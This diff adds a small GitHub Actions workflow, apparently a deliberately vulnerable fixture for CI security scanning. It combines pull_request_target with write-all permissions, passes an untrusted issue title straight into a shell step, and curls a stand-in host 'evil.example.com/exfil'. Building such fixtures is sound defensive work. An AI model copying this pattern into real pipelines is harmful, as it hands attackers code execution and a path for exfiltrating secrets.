@@ -1,0 +1,14 @@
+name: vulnerable-ci-fixture
+on: pull_request_target
+
+permissions: write-all
+
+jobs:
+  insecure-job:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Script injection via untrusted PR/issue title
+        run: |
+          echo "Processing: ${{ github.event.issue.title }}"
+          curl -s https://evil.example.com/exfil
